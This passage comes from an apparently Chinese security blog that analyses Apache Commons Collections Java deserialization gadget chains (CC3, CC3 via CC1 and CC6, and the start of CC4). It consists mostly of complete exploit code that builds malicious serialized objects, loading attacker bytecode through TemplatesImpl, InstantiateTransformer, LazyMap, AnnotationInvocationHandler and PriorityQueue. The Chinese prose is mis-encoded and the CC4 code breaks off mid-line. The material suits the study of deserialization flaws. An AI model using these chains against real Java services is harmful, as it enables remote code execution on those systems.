IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CC3è°ƒç”¨é“¾åˆ†æ"><a href="#CC3è°ƒç”¨é“¾åˆ†æ" class="headerlink" title="CC3è°ƒç”¨é“¾åˆ†æ"></a>CC3è°ƒç”¨é“¾åˆ†æ</h2><p>å› ä¸ºåªéœ€è¦è°ƒç”¨ <code>TemplatesImpl</code> ç±»çš„ <code>newTransformer()</code> æ–¹æ³•ï¼Œä¾¿å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬ï¼ŒæŸ¥æ‰¾è°è°ƒç”¨äº† <code>newTransformer()</code> </p>
<p><code> com.sun.org.apache.xalan.internal.xslt.trax#TrAXFilter.TrAXFilter()</code>,å› ä¸º<code>TrAXFilter()ç±»çš„newTransformer()</code>åœ¨æ„é€ å‡½æ•°é‡Œé¢ï¼Œæ–¹ä¾¿æˆ‘ä»¬ä¼ å‚ï¼Œæ‰€ä»¥é€‰æ‹©å®ƒï¼Œä½†æœ‰ä¸ªé—®é¢˜ï¼Œ<code>TrAXFilter</code>ç±»å¹¶æ²¡æœ‰ç»§æ‰¿<code>Serializable</code> æ¥å£ï¼Œä¸èƒ½åºåˆ—åŒ–æ‰€ä»¥æˆ‘ä»¬åªèƒ½ä»<code>TrAXFilter</code>çš„Classå…¥æ‰‹ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528100031807.png" alt="image-20240528100031807"></p>
<p>CC3çš„ä½œè€…æ²¡æœ‰è°ƒç”¨ <code>InvokerTransformer</code>ï¼Œè€Œæ˜¯è°ƒç”¨äº†ä¸€ä¸ªæ–°çš„ç±» <code>InstantiateTransformer</code>ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528101227501.png" alt="image-20240528101227501"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528111906340.png" alt="image-20240528111906340"></p>
<h3 id="CC3é“¾EXP"><a href="#CC3é“¾EXP" class="headerlink" title="CC3é“¾EXP"></a>CC3é“¾EXP</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\14341\\Desktop\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//    templates.newTransformer();</span><br>		<br>		<span class="hljs-comment">//ä¸ºäº†è°ƒç”¨Templates.newTransformer();</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>       <br>        instantiateTransformer.transform(TrAXFilter.class);<br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="CC1å®ç°CC3å®Œæ•´ç‰ˆ"><a href="#CC1å®ç°CC3å®Œæ•´ç‰ˆ" class="headerlink" title="CC1å®ç°CC3å®Œæ•´ç‰ˆ"></a>CC1å®ç°CC3å®Œæ•´ç‰ˆ</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br><br>         <span class="hljs-comment">//å®ç°instantiateTransformer.transform(TrAXFilter.class);</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]						&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br><br>		<span class="hljs-comment">//CC1</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationdhdlerConstructor.newInstance(Target.class, lazyMap);<br><br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlerConstructor.newInstance(Override.class, mapProxy);<br><br><br><span class="hljs-comment">//        serialize(o);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="CC6å®ç°CC3å®Œæ•´ç‰ˆ"><a href="#CC6å®ç°CC3å®Œæ•´ç‰ˆ" class="headerlink" title="CC6å®ç°CC3å®Œæ•´ç‰ˆ"></a>CC6å®ç°CC3å®Œæ•´ç‰ˆ</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>		<br>       <span class="hljs-comment">//å®ç°instantiateTransformer.transform(TrAXFilter.class);</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]						&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br><br>		<span class="hljs-comment">//CC6</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;v&quot;</span>);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);<br>		<br>        <span class="hljs-comment">// åœ¨ put ä¹‹åé€šè¿‡åå°„ä¿®æ”¹å€¼  </span><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazymap,chainedTransformer);<br><br><br><span class="hljs-comment">//        serialize(map2);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="">javaå®‰å…¨æ¼«è°ˆ-Javaä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„é‚£äº›æ–¹æ³•</a></p>
<p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=4&vd_source=d195054a6a081ba07486dcc86c6ba707">ç±»çš„åŠ¨æ€åŠ è½½</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC4</title>
    <url>/2024/06/01/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC4/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰é¢å‡ æ¡é“¾éƒ½æ˜¯CommonsCollections3ä¸­äº§ç”Ÿçš„ååºåˆ—åŒ–æ¼æ´ï¼Œåæ¥Apacheæ›´æ–°äº†å¤§ç‰ˆæœ¬4.0ï¼Œä¹Ÿäº§ç”Ÿäº†ååºåˆ—åŒ–æ¼æ´ã€‚</p>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul>
<li>JDK8u65</li>
<li>CommonsCollections4</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="CC4è°ƒç”¨é“¾åˆ†æ"><a href="#CC4è°ƒç”¨é“¾åˆ†æ" class="headerlink" title="CC4è°ƒç”¨é“¾åˆ†æ"></a>CC4è°ƒç”¨é“¾åˆ†æ</h2><p><img src="https://image.sp4rks.xyz/2024/06/CC4.png" alt="CC4"></p>
<p>åœ¨ä¹‹å‰çš„CCé“¾ä¸­ï¼Œæœ‰ä¸¤ç§æ‰§è¡Œä»£ç çš„æ–¹å¼<code>InvokerTransformer.transform()</code>å’Œ<code>InstantiateTransformer.transform()</code>åŠ¨æ€åŠ è½½å­—èŠ‚ç </p>
<p>å› ä¸ºCommonsCollections4å–æ¶ˆäº†InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹å¼ååºåˆ—åŒ–ã€‚</p>
<p>æ‰€ä»¥æ¥ä¸‹æ¥å»æ‰¾è°è°ƒç”¨äº†<code>transform()</code> æ–¹æ³•</p>
<p>æ‰¾åˆ°äº†<code>org.apache.commons.collections4.comparators#TransformingComparator.compare()</code>ï¼Œå› ä¸º<code>this.transformer</code>å¯æ§</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601123801402.png" alt="image-20240601123801402"></p>
<p>æ¥ç€æ‰¾è°è°ƒç”¨äº†<code>compare()</code>æ–¹æ³•ï¼Œæ‰¾åˆ°äº† <code>PriorityQueue.readObject().siftDownUsingComparator()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601123947569.png" alt="image-20240601123947569"></p>
<p><code>PriorityQueue.readObject()</code>ä¸­æ–¹æ³•è°ƒç”¨</p>
<p><img src="https://image.sp4rks.xyz/2024/06/6.png" alt="6"></p>
<p>æ•´æ¡è°ƒç”¨é“¾æ¡ï¼Œå…¶å®ç›¸å½“äºå…¥å£ç±»å˜äº†ï¼Œæ–°åŠ äº†ä¸€ä¸ªç±»ï¼Œæ‰§è¡Œä»£ç çš„éƒ¨åˆ†å’ŒCC3æ˜¯ä¸€æ ·çš„</p>
<h2 id="CC4ç¼–å†™"><a href="#CC4ç¼–å†™" class="headerlink" title="CC4ç¼–å†™"></a>CC4ç¼–å†™</h2><p>æ‰§è¡Œä»£ç çš„åœ°æ–¹å’ŒCC3æ˜¯ä¸€æ ·çš„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//æ‰§è¡Œä»£ç çš„ç±»</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-comment">//åŠ¨æ€åŠ è½½</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), instantiateTransformer&#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å°±ç”¨<code>TransformingComparator</code>å»è°ƒç”¨<code>chainedTransformer</code>çš„<code>transformers()</code>æ–¹æ³•</p>
<p>TransformingComparatorçš„æ„é€ å‡½æ•°èƒ½ç›´æ¥ä¼ å…¥transformers</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601125540711.png" alt="image-20240601125540711"></p>
<p>PriorityQueueçš„æ„é€ å‡½æ•°èƒ½ç›´æ¥ä¼ å…¥comparator</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601125701669.png" alt="image-20240601125701669"></p>
<p>èµ°åˆ°è¿™é€»è¾‘å…¶å®å°±èµ°å®Œäº†ï¼Œå½“æˆ‘ä»¬è¿è¡Œä¸€ä¸‹ï¼Œå‘ç°å…¶å®å¹¶ä¸èƒ½æ­£å¸¸è¿è¡Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//æ‰§è¡Œä»£ç çš„ç±»</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-comment">//åŠ¨æ€åŠ è½½</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), instantiateTransformer&#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><span class="hljs-comment">//        chainedTransformer.transform(1);</span><br><br><br>        <span class="hljs-comment">//è°ƒç”¨ ChainedTransformer.transform()</span><br>        <span class="hljs-type">TransformingComparator</span> <span 